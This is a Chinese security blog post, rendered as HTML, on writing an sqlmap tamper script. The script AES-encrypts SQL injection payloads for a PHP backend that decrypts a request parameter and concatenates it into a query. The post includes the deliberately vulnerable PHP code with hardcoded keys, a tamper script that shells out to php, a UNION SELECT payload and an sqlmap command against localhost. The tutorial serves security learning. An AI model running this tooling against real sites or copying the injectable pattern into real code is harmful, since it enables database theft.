@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="SQLMAP-temper编写"/>
+
+
+
+
+  <meta name="keywords" content="工具," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/13/SQLMAP-temper编写/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLMAP-temper编写">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/13/94BnqvRuyKIsoiE.png">
+<meta property="article:published_time" content="2020-03-12T16:58:06.000Z">
+<meta property="article:modified_time" content="2020-03-13T03:38:52.636Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/13/94BnqvRuyKIsoiE.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> SQLMAP-temper编写 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          SQLMAP-temper编写
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 13 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#后台脚本">后台脚本</a></li>
+<li><a href="#tamper编写">tamper编写</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>一般情况下sqlmap比自己写脚本方便，只需要处理好temper脚本，并且sqlmap能针对不同的数据库，这点很重要。</p>
+<p>正好之前看到一篇文章，自己也学习下，之后多用用sqlmap。</p>
+<h4><span id="后台脚本">后台脚本</span></h4><p>比如有这么一个后台处理的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">&#x2F;&#x2F;解密过程</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">	$td &#x3D; mcrypt_module_open(MCRYPT_RIJNDAEL_128,&#39;&#39;,MCRYPT_MODE_CBC,&#39;&#39;);</span><br><span class="line">	mcrypt_generic_init($td,&#39;ydhaqPQnexoaDuW3&#39;,&#39;2018201920202021&#39;);</span><br><span class="line">	$data &#x3D; mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	if(substr(trim($data),-6)!&#x3D;&#x3D;&#39;_mozhe&#39;)&#123;</span><br><span class="line">		echo &#39;&lt;script&gt;window.location.href&#x3D;&quot;&#x2F;index.php&quot;;&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return substr(trim($data),0,strlen(trim($data))-6);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;decode($_GET[&#39;id&#39;]);</span><br><span class="line">$sql&#x3D;&quot;select id,title,content,time from notice where id&#x3D;$id&quot;;</span><br><span class="line">$info&#x3D;$link-&gt;query($sql);</span><br><span class="line">$arr&#x3D;$info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单分析下，先对传入的id进行AES-128-CCB解密，之后我查了这个<code>mcrypt_module_open</code>，是个扩展，但是php7.1已经被废弃，于是改用<code>openssl_encrypt()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">&#x2F;&#x2F;解密过程</span><br><span class="line">$key &#x3D; &#39;hahahaha&#39;;</span><br><span class="line">class AES &#123;</span><br><span class="line"></span><br><span class="line">    public static function encrypt($string, $key)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变</span><br><span class="line">        $data &#x3D; openssl_encrypt($string, &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA);</span><br><span class="line">        $data &#x3D; strtolower(bin2hex($data));</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public static function decrypt($string, $key)</span><br><span class="line">    &#123;</span><br><span class="line">        $decrypted &#x3D; openssl_decrypt(hex2bin($string), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA);</span><br><span class="line">        return $decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id &#x3D; AES::decrypt($_GET[&#39;id&#39;],$key);</span><br><span class="line">$sql &#x3D; &quot;select * from th_user where uid&#x3D;$id&quot;;</span><br><span class="line">$info &#x3D; $link-&gt;query($sql);</span><br><span class="line">$arr &#x3D; $info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4><span id="tamper编写">tamper编写</span></h4><p>sqlmap是不会处理这种加密的，因此编写一个tamper脚本</p>
+<p>测试了一下，php使用<code>openssl_encrypt()</code>和python使用pycrypto模块同时选择<code>AES-128-CBC</code>加密结果不同，我的思路是系统调用一下php</p>
+<p>先准备一个被系统的调用<code>2.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key &#x3D; &#39;hahahaha&#39;;</span><br><span class="line">class AES &#123;</span><br><span class="line">    public static function encrypt($string, $key)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变</span><br><span class="line">        $data &#x3D; openssl_encrypt($string, &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA);</span><br><span class="line">        $data &#x3D; strtolower(bin2hex($data));</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public static function decrypt($string, $key)</span><br><span class="line">    &#123;</span><br><span class="line">        $decrypted &#x3D; openssl_decrypt(hex2bin($string), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA);</span><br><span class="line">        return $decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo AES::encrypt(base64_decode($argv[1]),$key);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>tamper脚本<code>aes.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2018 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)</span><br><span class="line">See the file &#39;LICENSE&#39; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def encrypt(text):</span><br><span class="line">    t &#x3D; base64.b64encode(text)</span><br><span class="line">    # print t</span><br><span class="line">    x &#x3D; os.popen(&#39;php 2.php &#39; + t).readlines()</span><br><span class="line">    return x[0]</span><br><span class="line"># print encrypt(&#39;-1 union select 1,2,3,4&#39;)</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    </span><br><span class="line">    return encrypt(payload)</span><br></pre></td></tr></table></figure>
+
+<p>注意，测试的时候将2.php放在<code>/tamper</code>目录下，跑sqlmap的时候需要放在<code>/sqlmap-master</code>下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?id&#x3D;1 --tamper aes.py --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/13/94BnqvRuyKIsoiE.png" alt="Snipaste_2020-03-13_11-32-30.png"></p>
+<hr>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://uknowsec.cn/posts/notes/SQLMap-tamper编写尝试.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/">
+        <span class="next-text nav-default">Linux下常见维权方式</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
